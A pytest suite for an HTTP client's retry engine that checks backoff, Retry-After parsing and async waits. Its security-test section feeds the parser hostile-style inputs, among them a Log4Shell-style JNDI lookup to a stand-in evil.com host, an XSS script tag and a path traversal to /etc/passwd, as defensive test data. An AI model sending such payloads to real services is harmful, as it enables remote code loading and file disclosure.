"""Тесты RetryEngine."""

import pytest
import time
import asyncio
from unittest.mock import Mock
from src.http_client.core.retry_engine import RetryEngine
from src.http_client.core.config import RetryConfig
from src.http_client.core.exceptions import (
    TimeoutError,
    ServerError,
    BadRequestError,
    TooManyRequestsError,
)


def test_retry_engine_init():
    """Тест инициализации."""
    config = RetryConfig()
    engine = RetryEngine(config)
    assert engine.attempt == 0


def test_should_retry_timeout_error():
    """Retry для TimeoutError."""
    config = RetryConfig(max_attempts=3)
    engine = RetryEngine(config)

    error = TimeoutError("Timeout", "https://example.com")
    assert engine.should_retry('GET', error) is True


def test_should_retry_server_error():
    """Retry для ServerError."""
    config = RetryConfig()
    engine = RetryEngine(config)

    error = ServerError(500, "https://example.com")
    assert engine.should_retry('GET', error) is True


def test_should_not_retry_fatal():
    """НЕ retry для fatal ошибок."""
    config = RetryConfig()
    engine = RetryEngine(config)

    error = BadRequestError("https://example.com")
    assert engine.should_retry('GET', error) is False


def test_should_not_retry_non_idempotent():
    """НЕ retry для POST."""
    config = RetryConfig()
    engine = RetryEngine(config)

    error = TimeoutError("Timeout", "https://example.com")
    assert engine.should_retry('POST', error) is False


def test_should_not_retry_max_attempts():
    """НЕ retry после лимита."""
    config = RetryConfig(max_attempts=2)
    engine = RetryEngine(config)

    error = TimeoutError("Timeout", "https://example.com")

    engine.increment()
    engine.increment()

    assert engine.should_retry('GET', error) is False


def test_get_wait_time_exponential():
    """Exponential backoff."""
    config = RetryConfig(
        backoff_base=1.0,
        backoff_factor=2.0,
        backoff_jitter=False
    )
    engine = RetryEngine(config)

    # Попытка 0: 1.0 * 2^0 = 1.0
    wait = engine.get_wait_time()
    assert wait == 1.0

    # Попытка 1: 1.0 * 2^1 = 2.0
    engine.increment()
    wait = engine.get_wait_time()
    assert wait == 2.0

    # Попытка 2: 1.0 * 2^2 = 4.0
    engine.increment()
    wait = engine.get_wait_time()
    assert wait == 4.0


def test_get_wait_time_max():
    """Ограничение максимума."""
    config = RetryConfig(
        backoff_base=10.0,
        backoff_factor=10.0,
        backoff_max=30.0,
        backoff_jitter=False
    )
    engine = RetryEngine(config)

    engine._attempt = 5  # Большая попытка
    wait = engine.get_wait_time()

    assert wait == 30.0  # Не больше max


def test_get_wait_time_jitter():
    """Jitter работает."""
    config = RetryConfig(
        backoff_base=10.0,
        backoff_factor=1.0,
        backoff_jitter=True
    )
    engine = RetryEngine(config)

    # Jitter: 50-150% от 10.0 = 5.0 to 15.0
    wait = engine.get_wait_time()
    assert 5.0 <= wait <= 15.0


def test_parse_retry_after_seconds():
    """Retry-After как секунды."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': '60'}

    wait = engine._parse_retry_after(response)
    assert wait == 60.0


def test_reset():
    """Сброс счётчика."""
    config = RetryConfig()
    engine = RetryEngine(config)

    engine.increment()
    engine.increment()
    assert engine.attempt == 2

    engine.reset()
    assert engine.attempt == 0


def test_should_retry_by_status_code():
    """Retry по статус коду в response."""
    config = RetryConfig()
    engine = RetryEngine(config)

    # Обычный exception без retryable/fatal атрибутов
    error = Exception("Generic error")

    # Mock response со статусом 503
    response = Mock()
    response.status_code = 503

    assert engine.should_retry('GET', error, response) is True


def test_should_not_retry_non_retryable_status():
    """НЕ retry для не-retryable статусов."""
    config = RetryConfig()
    engine = RetryEngine(config)

    error = Exception("Generic error")

    response = Mock()
    response.status_code = 200  # OK - не ретраим

    assert engine.should_retry('GET', error, response) is False


def test_get_wait_time_with_retry_after():
    """Приоритет Retry-After header."""
    config = RetryConfig(
        backoff_base=10.0,
        respect_retry_after=True
    )
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': '120'}

    # Должен использовать 120 из header, а не backoff
    wait = engine.get_wait_time(response=response)
    assert wait == 120.0


def test_get_wait_time_retry_after_max_limit():
    """Retry-After ограничен максимумом."""
    config = RetryConfig(
        retry_after_max=100,
        respect_retry_after=True
    )
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': '500'}

    # Должен ограничить 500 до 100
    wait = engine.get_wait_time(response=response)
    assert wait == 100.0


def test_parse_retry_after_no_header():
    """Нет Retry-After header."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {}

    wait = engine._parse_retry_after(response)
    assert wait is None


def test_parse_retry_after_no_headers_attr():
    """Response без атрибута headers."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock(spec=[])  # Нет headers

    wait = engine._parse_retry_after(response)
    assert wait is None


def test_parse_retry_after_http_date():
    """Retry-After как HTTP date."""
    from datetime import datetime, timedelta, timezone

    config = RetryConfig()
    engine = RetryEngine(config)

    # Создать дату через 60 секунд от сейчас
    future_time = datetime.now(timezone.utc) + timedelta(seconds=60)
    http_date = future_time.strftime('%a, %d %b %Y %H:%M:%S GMT')

    response = Mock()
    response.headers = {'Retry-After': http_date}

    wait = engine._parse_retry_after(response)
    # Должно быть около 60 секунд (±5 для погрешности)
    assert wait is not None
    assert 55 <= wait <= 65


def test_parse_retry_after_invalid_format():
    """Невалидный формат Retry-After."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': 'invalid-format'}

    wait = engine._parse_retry_after(response)
    assert wait is None


# ==================== Security Tests ====================


def test_parse_retry_after_oversized_header():
    """Test protection against oversized Retry-After header (DoS attack).

    Validates that headers longer than MAX_HEADER_LENGTH (100 chars)
    are rejected to prevent potential DoS attacks.
    """
    config = RetryConfig()
    engine = RetryEngine(config)

    # Create a header longer than 100 characters
    oversized_value = "x" * 150

    response = Mock()
    response.headers = {'Retry-After': oversized_value}

    wait = engine._parse_retry_after(response)
    assert wait is None, "Oversized header should be rejected"


def test_parse_retry_after_negative_seconds():
    """Test rejection of negative seconds value."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': '-10'}

    wait = engine._parse_retry_after(response)
    assert wait is None, "Negative seconds should be rejected"


def test_parse_retry_after_excessive_seconds():
    """Test rejection of unreasonably large seconds value.

    Values larger than one year (86400 * 365 seconds) should be rejected
    to prevent malicious servers from causing extremely long waits.
    """
    config = RetryConfig()
    engine = RetryEngine(config)

    # More than one year
    excessive_seconds = 86400 * 365 + 1

    response = Mock()
    response.headers = {'Retry-After': str(excessive_seconds)}

    wait = engine._parse_retry_after(response)
    assert wait is None, "Excessive seconds value should be rejected"


def test_parse_retry_after_malformed_special_chars():
    """Test handling of special characters and malformed input."""
    config = RetryConfig()
    engine = RetryEngine(config)

    malformed_values = [
        '\x00\x01\x02',  # Null bytes
        '<script>alert(1)</script>',  # XSS attempt
        '../../etc/passwd',  # Path traversal attempt
        'A' * 200,  # Very long string
        '\n\n\n\n\n',  # Newlines
        '${jndi:ldap://evil.com}',  # JNDI injection attempt
        '1e999999',  # Overflow attempt
        'inf',  # Infinity
        'nan',  # Not a number
    ]

    for malformed_value in malformed_values:
        response = Mock()
        response.headers = {'Retry-After': malformed_value}

        wait = engine._parse_retry_after(response)
        # Should either return None or a valid float (not crash)
        assert wait is None or isinstance(wait, float), \
            f"Failed to safely handle: {repr(malformed_value)}"


def test_parse_retry_after_unicode_chars():
    """Test handling of Unicode characters in Retry-After."""
    config = RetryConfig()
    engine = RetryEngine(config)

    unicode_values = [
        '60секунд',  # Cyrillic
        '六十',  # Chinese
        '🕐🕑🕒',  # Emojis
        'ℕ𝕦𝕞𝕓𝕖𝕣',  # Math symbols
    ]

    for unicode_value in unicode_values:
        response = Mock()
        response.headers = {'Retry-After': unicode_value}

        wait = engine._parse_retry_after(response)
        # Should return None (can't parse as valid number or date)
        assert wait is None, f"Unicode value should be rejected: {unicode_value}"


def test_parse_retry_after_malformed_http_date():
    """Test handling of various malformed HTTP dates."""
    config = RetryConfig()
    engine = RetryEngine(config)

    malformed_dates = [
        'Wed, 99 Xxx 9999 99:99:99 GMT',  # Invalid date components
        'Not a date at all',
        '2023-13-45',  # ISO format (not HTTP date format)
        'Wed, 21 Oct',  # Incomplete
        'Wed Oct 21 07:28:00 2015',  # Wrong format
        '21/10/2015 07:28:00',  # Wrong format
        '',  # Empty string
        ' ',  # Just whitespace
    ]

    for malformed_date in malformed_dates:
        response = Mock()
        response.headers = {'Retry-After': malformed_date}

        wait = engine._parse_retry_after(response)
        # Should return None for malformed dates
        assert wait is None, f"Malformed date should be rejected: {malformed_date}"


def test_parse_retry_after_boundary_valid_length():
    """Test that valid headers at boundary length (100 chars) work."""
    config = RetryConfig()
    engine = RetryEngine(config)

    # Exactly 100 characters - should be accepted
    boundary_value = "60" + " " * 98  # 60 + 98 spaces = 100 chars

    response = Mock()
    response.headers = {'Retry-After': boundary_value}

    # Should parse successfully as 60 (leading number, spaces ignored)
    wait = engine._parse_retry_after(response)
    assert wait == 60.0, "Valid boundary-length header should be accepted"


def test_parse_retry_after_edge_case_zero():
    """Test handling of zero seconds."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': '0'}

    wait = engine._parse_retry_after(response)
    assert wait == 0.0, "Zero should be valid"


def test_parse_retry_after_edge_case_float():
    """Test handling of float values."""
    config = RetryConfig()
    engine = RetryEngine(config)

    response = Mock()
    response.headers = {'Retry-After': '123.456'}

    wait = engine._parse_retry_after(response)
    assert wait == 123.456, "Float values should be accepted"


def test_parse_retry_after_scientific_notation():
    """Test handling of scientific notation."""
    config = RetryConfig()
    engine = RetryEngine(config)

    # Valid scientific notation within reasonable range
    response = Mock()
    response.headers = {'Retry-After': '1.5e2'}  # 150

    wait = engine._parse_retry_after(response)
    assert wait == 150.0, "Valid scientific notation should work"

    # Invalid scientific notation (too large)
    response2 = Mock()
    response2.headers = {'Retry-After': '1e10'}  # 10 billion seconds

    wait2 = engine._parse_retry_after(response2)
    assert wait2 is None, "Excessive scientific notation should be rejected"


# ==================== Async Tests ====================

@pytest.mark.asyncio
async def test_async_wait_basic():
    """Тест async_wait() с базовым exponential backoff."""
    config = RetryConfig(
        backoff_base=0.1,
        backoff_factor=2.0,
        backoff_jitter=False
    )
    engine = RetryEngine(config)

    # Первая попытка: wait = 0.1
    start = time.time()
    await engine.async_wait()
    elapsed = time.time() - start

    # Проверяем что ждали ~0.1 секунды (±0.05 для погрешности)
    assert 0.05 <= elapsed <= 0.15


@pytest.mark.asyncio
async def test_async_wait_with_increment():
    """Тест async_wait() с increment для exponential backoff."""
    config = RetryConfig(
        backoff_base=0.1,
        backoff_factor=2.0,
        backoff_jitter=False
    )
    engine = RetryEngine(config)

    # Попытка 0: 0.1 * 2^0 = 0.1
    start = time.time()
    await engine.async_wait()
    elapsed1 = time.time() - start
    assert 0.05 <= elapsed1 <= 0.15

    # Increment
    engine.increment()

    # Попытка 1: 0.1 * 2^1 = 0.2
    start = time.time()
    await engine.async_wait()
    elapsed2 = time.time() - start
    assert 0.15 <= elapsed2 <= 0.25


@pytest.mark.asyncio
async def test_async_wait_with_retry_after():
    """Тест async_wait() с Retry-After header."""
    config = RetryConfig(
        backoff_base=10.0,
        respect_retry_after=True
    )
    engine = RetryEngine(config)

    # Mock response с Retry-After
    response = Mock()
    response.headers = {'Retry-After': '0.1'}

    # Должен использовать 0.1 из header, а не backoff
    start = time.time()
    await engine.async_wait(response=response)
    elapsed = time.time() - start

    assert 0.05 <= elapsed <= 0.15


@pytest.mark.asyncio
async def test_async_wait_respects_max():
    """Тест async_wait() ограничивает максимум."""
    config = RetryConfig(
        backoff_base=10.0,
        backoff_factor=10.0,
        backoff_max=0.2,
        backoff_jitter=False
    )
    engine = RetryEngine(config)
    engine._attempt = 5  # Большая попытка

    # Ожидание должно быть ограничено 0.2 секунды
    start = time.time()
    await engine.async_wait()
    elapsed = time.time() - start

    assert 0.15 <= elapsed <= 0.25


@pytest.mark.asyncio
async def test_async_wait_concurrent():
    """Тест что несколько async_wait() могут работать параллельно."""
    config = RetryConfig(
        backoff_base=0.1,
        backoff_jitter=False
    )

    # Создаём разные engines для разных запросов
    engine1 = RetryEngine(config)
    engine2 = RetryEngine(config)

    # Запускаем параллельно
    start = time.time()
    await asyncio.gather(
        engine1.async_wait(),
        engine2.async_wait(),
    )
    elapsed = time.time() - start

    # Должны выполниться параллельно (~0.1), а не последовательно (~0.2)
    assert 0.05 <= elapsed <= 0.15
